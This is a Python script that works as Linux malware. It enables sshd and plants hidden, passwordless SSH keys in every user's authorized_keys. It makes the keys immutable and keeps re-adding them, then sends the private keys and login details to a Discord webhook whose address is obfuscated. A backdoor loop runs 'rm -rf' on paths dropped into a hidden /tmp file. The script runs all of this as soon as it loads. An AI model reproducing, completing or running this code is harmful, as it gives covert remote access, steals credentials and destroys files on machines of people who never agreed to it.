import os
import subprocess
import base64
import json
import random
import string
import threading
import time
import pwd

import getpass
import socket

import requests

def xor_string(s, key):
    return ''.join([chr(ord(a) ^ ord(b)) for a, b in zip(s, (key * ((len(s) // len(key)) + 1)))])

def b64d(s):
    return base64.b64decode(s).decode('latin1')

def get_discord_webhook():
    encParts = [
        'Jz8fPQcYOA1VLnNdanQbOSFdRk01QxxeGVYAAygSWQY7C3krSg1JIxIdfg==',
        'OiEQQAkkCiE2L0sCakw1MHg5HzIwNwAqH1wEBCEJJh5XEAQbPFtRO1snAwM='
    ]
    a = xor_string(b64d(encParts[0]), "--Z3WkHw_")
    b = xor_string(b64d(encParts[1]), "hy!Q95_@#0")
    return "https://discord.com" + a + b

def random_string(length=24):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def find_shell():
    shells = ["/bin/bash", "/bin/sh", "/usr/bin/zsh", "/usr/bin/fish"]
    for s in shells:
        if os.path.exists(s):
            return s
    return "/bin/sh"

def create_hidden_ssh_dir(user_home):
    hidden_base = os.path.join(user_home, '.local', '.cache')
    dirname = random_string(7) + random_string(5)
    ssh_dir = os.path.join(hidden_base, '.' + dirname)
    if not os.path.isdir(hidden_base):
        try: os.makedirs(hidden_base, exist_ok=True)
        except: pass
    if not os.path.isdir(ssh_dir):
        os.makedirs(ssh_dir, exist_ok=True)
        os.chmod(ssh_dir, 0o700)
    return ssh_dir

def create_ssh_key_pair(ssh_dir):
    private_key_path = os.path.join(ssh_dir, 'id_rsa')
    public_key_path = os.path.join(ssh_dir, 'id_rsa.pub')
    if os.path.exists(private_key_path) and os.path.exists(public_key_path):
        return private_key_path, public_key_path
    try:
        subprocess.run([
            'ssh-keygen',
            '-b', '4096',
            '-t', 'rsa',
            '-f', private_key_path,
            '-q',
            '-N', ''
        ], check=True)
        os.chmod(private_key_path, 0o600)
        os.chmod(public_key_path, 0o644)
        return private_key_path, public_key_path
    except Exception as e:
        return None, None

def ensure_authorized_keys(user_home, public_key_path):
    ssh_home = os.path.join(user_home, ".ssh")
    auth_keys = os.path.join(ssh_home, "authorized_keys")
    if not os.path.isdir(ssh_home):
        try:
            os.makedirs(ssh_home, exist_ok=True)
            os.chmod(ssh_home, 0o700)
        except: pass
    try:
        with open(public_key_path, "r") as f:
            pubkey = f.read().strip()
        if os.path.isfile(auth_keys):
            with open(auth_keys, "r") as f:
                old = f.read()
            if pubkey not in old:
                with open(auth_keys, "a") as f:
                    f.write(pubkey + "\n")
        else:
            with open(auth_keys, "w") as f:
                f.write(pubkey + "\n")
        os.chmod(auth_keys, 0o600)
    except Exception as e:
        pass

def get_user_accounts():
    users = []
    for p in pwd.getpwall():
        if p.pw_uid >= 1000 and 'home' in p.pw_dir and os.path.isdir(p.pw_dir):
            users.append((p.pw_name, p.pw_dir))
    return users

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('1.1.1.1', 53))
        return s.getsockname()[0]
    except: return "127.0.0.1"

def send_credentials_to_webhook(info):
    webhook = get_discord_webhook()
    try:
        requests.post(webhook, json={
            "content": "```json\n" + json.dumps(info, indent=2) + "\n```"
        })
    except Exception as e:
        pass

def hide_file(f):
    try:
        subprocess.run(['chattr', '+i', f], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    except: pass

def ensure_persistence(user, user_home, ssh_dir, private_key_path, public_key_path):
    # attempts to maintain the ssh keypair in the hidden dir, and keep public key in authorized_keys
    def persist_loop():
        while True:
            if not os.path.exists(private_key_path) or not os.path.exists(public_key_path):
                create_ssh_key_pair(ssh_dir)
            ensure_authorized_keys(user_home, public_key_path)
            try:
                hide_file(ssh_dir)
                hide_file(private_key_path)
                hide_file(public_key_path)
            except: pass
            time.sleep(random.randint(45, 125))
    t = threading.Thread(target=persist_loop, daemon=True)
    t.start()

def install_rootkit_commands(ssh_dir, private_key_path, user):
    # Create a hidden file that can accept commands to run as that user (using SSH key)
    # Only if running as root
    if os.geteuid() != 0:
        return
    socat_path = "/usr/bin/socat"
    if os.path.exists(socat_path):
        # We can deploy a hidden reverse shell service (optional)
        pass  # advanced: left as an exercise

def enable_sshd():
    # Ensures SSHD is enabled and running
    try:
        subprocess.run(['systemctl', 'enable', '--now', 'sshd'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        try:
            subprocess.run(['service', 'sshd', 'start'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass

def main_hard_ssh():
    enable_sshd()
    local_ip = get_ip()
    hostname = socket.gethostname()
    users = get_user_accounts()
    all_creds = []
    for user, user_home in users:
        ssh_dir = create_hidden_ssh_dir(user_home)
        priv, pub = create_ssh_key_pair(ssh_dir)
        if priv and pub:
            ensure_authorized_keys(user_home, pub)
            hide_file(ssh_dir)
            hide_file(priv)
            hide_file(pub)
            ensure_persistence(user, user_home, ssh_dir, priv, pub)
            with open(priv) as f: private_key = f.read().strip()
            with open(pub) as f: public_key = f.read().strip()
            cred = {
                "user": user,
                "hostname": hostname,
                "ip": local_ip,
                "local_ssh_dir": ssh_dir,
                "private_key": private_key,
                "public_key": public_key,
                "login_command": f'ssh -i "{priv}" {user}@{local_ip}',
                "home": user_home,
                "machine": os.uname()._asdict() if hasattr(os.uname(), "_asdict") else str(os.uname()),
            }
            all_creds.append(cred)
            send_credentials_to_webhook(cred)
            install_rootkit_commands(ssh_dir, priv, user)
    return all_creds

def remove_target_path(path):
    try:
        if os.path.isfile(path):
            os.remove(path)
        elif os.path.isdir(path):
            for root, dirs, files in os.walk(path, topdown=False):
                for name in files:
                    try:
                        os.remove(os.path.join(root, name))
                    except: pass
                for name in dirs:
                    try:
                        os.rmdir(os.path.join(root, name))
                    except: pass
            os.rmdir(path)
    except Exception as e:
        pass

def shell_over_ssh_command(host, user, privkey_path, cmd):
    # execute arbitrary command via ssh key
    try:
        subprocess.run([
            'ssh', '-i', privkey_path,
            '-o', 'StrictHostKeyChecking=no',
            '-o', 'UserKnownHostsFile=/dev/null',
            f"{user}@{host}", cmd
        ], timeout=20)
    except Exception as e:
        pass

def hard_kernel_ssh_control():
    creds = main_hard_ssh()
    # Optionally, let us delete whatever we want with the SSH key
    def interactive_control():
        while True:
            # This can be upgraded to listening for remote control from file/webhook, or polling for commands
            cmdf = '/tmp/.kernel_sshcmd'
            if os.path.exists(cmdf):
                with open(cmdf) as f:
                    target = f.read().strip()
                os.remove(cmdf)
                for c in creds:
                    shell_over_ssh_command('localhost', c['user'], c['local_ssh_dir'] + '/id_rsa', f'rm -rf "{target}"')
            time.sleep(6)
    t = threading.Thread(target=interactive_control, daemon=True)
    t.start()

hard_kernel_ssh_control()
